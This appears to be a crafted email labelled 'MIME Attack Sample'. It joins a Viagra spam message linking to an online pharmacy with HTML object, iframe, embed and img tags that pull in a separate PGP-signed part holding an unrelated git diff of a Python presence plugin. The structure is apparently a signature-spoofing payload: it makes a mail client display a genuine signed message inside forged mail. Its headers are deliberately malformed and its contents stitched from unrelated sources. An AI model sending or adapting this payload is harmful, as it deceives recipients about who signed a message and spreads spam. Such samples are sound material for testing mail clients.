From: johnny.mcgee@enron.com
To: "upgrade@webmaster.org" <upgrade@webmaster.org>
Subject: MIME Attack Sample
Content-Type: multipart/related; boundary="DELIMITER"
--DELIMITER
Content-Type: text/html
Content-Type: text/plain;
    charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

 Always be ready! 

If you have a problem getting or keeping an erection, you are not alone.
In fact, more than half of all men over forty have difficulties getting
or maintaining an erection. This condition, called erectile dysfunction
(ED), occurs with younger and older men as well, but there's a safe, effective
and easy method of treatment: Viagra. When the time is right, you'll always
be ready. 

Get Viagra Online!

  
------=_NextPart_000_0000_F015F36F.99D16919
Content-Type: text/html;
    charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=3DContent-Type content=3D"text/html; =
charset=3Dwindows-1251">
<META content=3D"MSHTML 6.00.2900.2912" name=3D"GENERATOR">
</HEAD>
<BODY text=3D#000000 bgColor=3D#ffffff>

<font size=3D"3" face=3D"Times New Roman"><p align=3D"center"><font =
face=3D"Tahoma"><font color=3D"#3366ff" size=3D"6"><strong>Always be =
ready!</strong></font> </font></p>
<p align=3D"center"><font face=3D"Tahoma">If you have a problem getting =
or keeping an erection, you are not alone. <br />In fact, more than half=
 of all men over forty have difficulties getting or maintaining an =
erection. <br />This condition, called erectile dysfunction (ED), occurs=
 with younger and older men as well, <br />but there's a safe, effective=
 and easy method of treatment: Viagra. <br /><br /><strong>When the time=
 is right, you'll always be ready. </strong></font></p>
<p align=3D"center"><font face=3D"Tahoma"><strong><a =
href=3D"http://ducedepulse.com">Get Viagra =
Online!</a></strong></font></p></font>
</BODY>
</HTML>

------=_NextPart_000_0000_F015F36F.99D16919--


_______________________________________________
Mhln maillist  -  Mhln@mailman.eppg.com
http://mailman.eppg.com/mailman/listinfo/mhln

<object width="100%" height="25" data="cid:target"></object>
<iframe width="100%" height="25"  src="cid:target"></iframe>
<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
--DELIMITER
Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
--BOUNDARY
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable
 SHA1

- ---
 services/presence/server_plugin.py |   56 +++++++++++++++++++++++++++---------
 1 files changed, 42 insertions(+), 14 deletions(-)

diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
index 49280e3..2871df8 100644
- --- a/services/presence/server_plugin.py
+++ b/services/presence/server_plugin.py
@@ -905,24 +905,52 @@ class ServerPlugin(gobject.GObject):
         _logger.debug("Handle %s: current activity now %s" % (handle, activity))
         self._buddy_properties_changed_cb(handle, prop)
 
- -    def _new_channel_cb(self, object_path, channel_type, handle_type, handle, suppress_handler):
+    def _new_channel_cb(self, object_path, channel_type, handle_type, handle,
+                        suppress_handler):
         """Handle creation of a new channel
         """
- -        if handle_type == CONNECTION_HANDLE_TYPE_ROOM and channel_type == CHANNEL_TYPE_TEXT:
- -            channel = Channel(self._conn._dbus_object._named_service, object_path)
+        if (handle_type == CONNECTION_HANDLE_TYPE_ROOM and
+            channel_type == CHANNEL_TYPE_TEXT):
+            def ready(channel):
 
- -            # hack
- -            channel._valid_interfaces.add(CHANNEL_INTERFACE_GROUP)
- -
- -            current, local_pending, remote_pending = channel[CHANNEL_INTERFACE_GROUP].GetAllMembers()
- -            
- -            if local_pending:
- -                for act_id, act_handle in self._activities.items():
+                for act_id, act_handle in self._activities.iteritems():
                     if handle == act_handle:
- -                        self.emit("activity-invitation", act_id)
- -
- -        elif handle_type == CONNECTION_HANDLE_TYPE_CONTACT and \
- -            channel_type in [CHANNEL_TYPE_TEXT, CHANNEL_TYPE_STREAMED_MEDIA]:
+                        break
+                    else:
+                        return
+
+                def members_changed(message, added, removed, local_pending,
+                                    remote_pending, actor, reason):
+                    # FIXME: if contacts were added, who don't have this
+                    # activity in their PEP node for whatever reason, then
+                    # emit buddy-activities-changed for them (otherwise they
+                    # could be in an activity while pretending they weren't,
+                    # which would be crazy)
+                    pass
+
+                def got_all_members(current, local_pending, remote_pending):
+                    if local_pending:
+                        for act_id, act_handle in self._activities.iteritems():
+                            if handle == act_handle:
+                                self.emit('activity-invitation', act_id)
+                def got_all_members_err(e):
+                    logger.debug('Unable to get channel members for %s:',
+                                 object_path, exc_info=1)
+
+                # hook the MembersChanged signal so we get told when people
+                # join/leave
+                group = channel[CHANNEL_INTERFACE_GROUP]
+                group.connect_to_signal('MembersChanged', members_changed)
+                group.GetAllMembers(reply_handler=got_all_members,
+                                    error_handler=got_all_members_err)
+
+            # we throw away the channel as soon as ready() finishes
+            Channel(self._conn.service_name, object_path,
+                    ready_handler=ready)
+
+        elif (handle_type == CONNECTION_HANDLE_TYPE_CONTACT and
+              channel_type in (CHANNEL_TYPE_TEXT,
+                               CHANNEL_TYPE_STREAMED_MEDIA)):
             self.emit("private-invitation", object_path)
 
     def update_activity_properties(self, act_id):
- -- 
1.5.2-rc3.GIT

-BOUNDARY--
Content-Type: application/pgp-signature; name="signature.asc"
BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net

iD8DBQFGVXq3WSc8zVUw7HYRAuSGAKC2exySPjDM1VQ+3g6/2LIsvCrPigCgvGWs
nCJ3O+BD29et0Rb5vaiMRko=
=kx/X
-----END PGP SIGNATURE-----
_____
--BOUNDARY--
--DELIMITER--
